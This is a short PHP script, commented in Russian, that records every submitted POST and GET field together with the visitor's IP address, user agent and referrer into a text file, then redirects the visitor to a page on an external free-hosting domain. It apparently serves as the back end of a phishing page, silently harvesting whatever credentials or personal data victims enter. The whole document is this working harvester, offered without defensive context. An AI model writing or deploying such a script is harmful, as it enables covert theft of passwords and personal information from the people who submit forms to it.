<?
$file="file2.txt"; //файл куда записываем все
$data=date("d.m.Y H:i"); //в скобках прописан формат отображения даты D - день недели, M - месяц Y - год, времени h - часы, i - минуты  
$ip=trim($_SERVER['REMOTE_ADDR']); //ip
$sysinfo=trim($_SERVER['HTTP_USER_AGENT']); //много всякой информации
if(is_file($file)){ //Проверяем наличие файла и возможность работы с ним 
$fo=fopen($file,"a+"); //Открываем файл на запись в конец 
$res2 = print_r($_POST, true); //методом POST все берем
$res3 = print_r($_GET, true); //методом GET все берем
$res4 = $_SERVER['HTTP_REFERER']; //откуда пришел пользователь
$res="\n$data  |  $ip  |  $sysinfo |  $res4 |\nPOST: $res2 \nGET: $res3";
$fw=fwrite($fo,$res); //Записываем в файл 
fclose($fo); //Закрываем файл 
}
header("Location: http://flagruger.16mb.com/call.html"); //редирект
die();
?>
